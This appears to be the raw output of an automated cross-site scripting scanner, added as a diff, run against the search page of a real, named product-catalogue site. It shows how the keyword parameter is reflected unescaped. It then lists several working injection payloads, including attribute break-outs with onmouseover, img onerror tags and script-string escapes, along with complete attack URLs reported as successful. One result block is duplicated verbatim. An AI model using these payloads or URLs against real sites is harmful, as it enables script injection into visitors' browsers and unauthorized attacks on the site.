@@ -1,0 +1,131 @@
+http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=XXXXXXX
+
+GET Params:[1]
+['keyword']
+_______________________________________________________________________________________________________
+http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=abc/uvw"xyz'yxz<zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [3]
+<meta name="keywords" content="abc/uvw"xyz'yxz<zxy,abc/uvw"xyz'yxz<zxy报价,abc/uvw"xyz'yxz<zxy最新报价,abc/uvw"xyz'yxz<zxy大全,abc/uvw"xyz'yxz<zxy报价大全" />
+<meta name="description" content="天极产品库_wap版提供abc/uvw"xyz'yxz<zxy最新报价信息,包括abc/uvw"xyz'yxz<zxy价格,参数,评测,图片,论坛等详细内容." />
+<input type="text" id = "textin" value="abc/uvw"xyz'yxz<zxy" name="keyword" class="wapin" onClick="this.value='';">
+
+----------------------------------------------------------------------------------
+HTML Context: [1]
+<title>abc/uvw"xyz'yxz<zxy最新报价-abc/uvw"xyz'yxz<zxy大全-天极产品库-wap版</title>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script>
+    var pageNo =  1;
+    var startIndex=0;
+    function getNextProductlist(){
+        return;
+    	var keyword ='abc/uvw"xyz'yxz<zxy';
+    	pageNo += 1;
+        startIndex=20*(pageNo-1);
+
+        if(pageNo>10) return;
+
+            var s=document.createElement('script');
+            s.src='http://pinterface.tianjimedia.com/front/wap/getNewData.jsp?type=12&pn='+pageNo+'&keyword='+keyword;
+            document.body.appendChild(s);
+            }
+            function addSearchResult(){
+            	var oBject = eval('(' + searchResult + ')');
+                  var searchResultList=oBject.list;
+                  var length = searchResultList.length;
+                  for(var i = 0; i < length; i++){
+
+                     var e = "<dl><dt><span>"+(startIndex+1)+"</span><a href='http://wap.yesky.com/product/product/"+parseInt(searchResultList[i].id/1000)+"/"+searchResultList[i].id+"/'>"+searchResultList[i].productName+"</a></dt><dd>￥"+pricenum(searchResultList[i].price,searchResultList[i].status)+"</dd></dl>";
+						// alert(e);
+
+                   startIndex++;
+                   $("#add").append(e);
+
+                }
+
+    }
+
+</script>
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+	Attr-Single	Encapsulated With Double Quotes: Can't Break the Context
+Mitigation        "	'	<	/ 
+ATTR:		False	True	False	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert`1`']
+
+ATTR Attack Url: http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=" onmouseover="alert`1`
+
+=>Detection  Successful with Payload: " onmouseover="alert`1`
+
+FINAL OUTPUT: 
+b'<meta name="keywords" content="" onmouseover="alert`1`," onmouseover="alert`1`\xe6\x8a\xa5\xe4\xbb\xb7," onmouseover="alert`1`\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7," onmouseover="alert`1`\xe5\xa4\xa7\xe5\x85\xa8," onmouseover="alert`1`\xe6\x8a\xa5\xe4\xbb\xb7\xe5\xa4\xa7\xe5\x85\xa8" />\n'b'<meta name="description" content="\xe5\xa4\xa9\xe6\x9e\x81\xe4\xba\xa7\xe5\x93\x81\xe5\xba\x93_wap\xe7\x89\x88\xe6\x8f\x90\xe4\xbe\x9b" onmouseover="alert`1`\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7\xe4\xbf\xa1\xe6\x81\xaf,\xe5\x8c\x85\xe6\x8b\xac" onmouseover="alert`1`\xe4\xbb\xb7\xe6\xa0\xbc,\xe5\x8f\x82\xe6\x95\xb0,\xe8\xaf\x84\xe6\xb5\x8b,\xe5\x9b\xbe\xe7\x89\x87,\xe8\xae\xba\xe5\x9d\x9b\xe7\xad\x89\xe8\xaf\xa6\xe7\xbb\x86\xe5\x86\x85\xe5\xae\xb9." />\n'<input type="text" id = "textin" value="" onmouseover="alert`1`" name="keyword" class="wapin" onClick="this.value='';">
+	Attr-Single	Encapsulated With Double Quotes: Can't Break the Context
+Mitigation        "	'	<	/ 
+ATTR:		False	True	False	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert`1`']
+
+ATTR Attack Url: http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=" onmouseover="alert`1`
+
+=>Detection  Successful with Payload: " onmouseover="alert`1`
+
+FINAL OUTPUT: 
+b'<meta name="keywords" content="" onmouseover="alert`1`," onmouseover="alert`1`\xe6\x8a\xa5\xe4\xbb\xb7," onmouseover="alert`1`\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7," onmouseover="alert`1`\xe5\xa4\xa7\xe5\x85\xa8," onmouseover="alert`1`\xe6\x8a\xa5\xe4\xbb\xb7\xe5\xa4\xa7\xe5\x85\xa8" />\n'b'<meta name="description" content="\xe5\xa4\xa9\xe6\x9e\x81\xe4\xba\xa7\xe5\x93\x81\xe5\xba\x93_wap\xe7\x89\x88\xe6\x8f\x90\xe4\xbe\x9b" onmouseover="alert`1`\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7\xe4\xbf\xa1\xe6\x81\xaf,\xe5\x8c\x85\xe6\x8b\xac" onmouseover="alert`1`\xe4\xbb\xb7\xe6\xa0\xbc,\xe5\x8f\x82\xe6\x95\xb0,\xe8\xaf\x84\xe6\xb5\x8b,\xe5\x9b\xbe\xe7\x89\x87,\xe8\xae\xba\xe5\x9d\x9b\xe7\xad\x89\xe8\xaf\xa6\xe7\xbb\x86\xe5\x86\x85\xe5\xae\xb9." />\n'<input type="text" id = "textin" value="" onmouseover="alert`1`" name="keyword" class="wapin" onClick="this.value='';">
+	Attr-Single	Encapsulated With Double Quotes: Can't Break the Context
+Mitigation        "	'	<	/ 
+ATTR:		False	True	False	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert`1`']
+
+ATTR Attack Url: http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=" onmouseover="alert`1`
+
+=>Detection  Successful with Payload: " onmouseover="alert`1`
+
+FINAL OUTPUT: 
+b'<meta name="keywords" content="" onmouseover="alert`1`," onmouseover="alert`1`\xe6\x8a\xa5\xe4\xbb\xb7," onmouseover="alert`1`\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7," onmouseover="alert`1`\xe5\xa4\xa7\xe5\x85\xa8," onmouseover="alert`1`\xe6\x8a\xa5\xe4\xbb\xb7\xe5\xa4\xa7\xe5\x85\xa8" />\n'b'<meta name="description" content="\xe5\xa4\xa9\xe6\x9e\x81\xe4\xba\xa7\xe5\x93\x81\xe5\xba\x93_wap\xe7\x89\x88\xe6\x8f\x90\xe4\xbe\x9b" onmouseover="alert`1`\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7\xe4\xbf\xa1\xe6\x81\xaf,\xe5\x8c\x85\xe6\x8b\xac" onmouseover="alert`1`\xe4\xbb\xb7\xe6\xa0\xbc,\xe5\x8f\x82\xe6\x95\xb0,\xe8\xaf\x84\xe6\xb5\x8b,\xe5\x9b\xbe\xe7\x89\x87,\xe8\xae\xba\xe5\x9d\x9b\xe7\xad\x89\xe8\xaf\xa6\xe7\xbb\x86\xe5\x86\x85\xe5\xae\xb9." />\n'<input type="text" id = "textin" value="" onmouseover="alert`1`" name="keyword" class="wapin" onClick="this.value='';">
+Mitigation        "	'	<	/ 
+HTML:		False	False	False	False
+
+Attack Payloads for HTML
+["<img src=x onerror='alert`1`'>", '<img src=x onerror="alert`1`">']
+
+HTML Attack Url: http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=<img src=x onerror='alert`1`'>
+
+=>Detection  Successful with Payload: <img src=x onerror='alert`1`'>
+
+FINAL OUTPUT: 
+b"<img src=x onerror='alert`1`'>\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7-<img src=x onerror='alert`1`'>\xe5\xa4\xa7\xe5\x85\xa8-\xe5\xa4\xa9\xe6\x9e\x81\xe4\xba\xa7\xe5\x93\x81\xe5\xba\x93-wap\xe7\x89\x88</title>\n"
+HTML Attack Url: http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=<img src=x onerror="alert`1`">
+
+=>Detection  Successful with Payload: <img src=x onerror="alert`1`">
+
+FINAL OUTPUT: 
+b'<img src=x onerror="alert`1`">\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7-<img src=x onerror="alert`1`">\xe5\xa4\xa7\xe5\x85\xa8-\xe5\xa4\xa9\xe6\x9e\x81\xe4\xba\xa7\xe5\x93\x81\xe5\xba\x93-wap\xe7\x89\x88</title>\n'	Script-Double = 	Encapsulated With Single Quotes: Can't Break the Context
+Mitigation        "	'	<	/ 
+SCRIPT:		True	False	False	False
+
+Attack Payloads for SCRIPT
+["'; confirm`1`; '", '</script><script>alert`1`</script>']
+
+SCRIPT Attack Url: http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword='; confirm`1`; '
+
+=>Detection  Successful with Payload: '; confirm`1`; '
+
+FINAL OUTPUT: 
+
+SCRIPT Attack Url: http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=</script><script>alert`1`</script>
+
+=>Detection  Successful with Payload: </script><script>alert`1`</script>
+
+FINAL OUTPUT: 
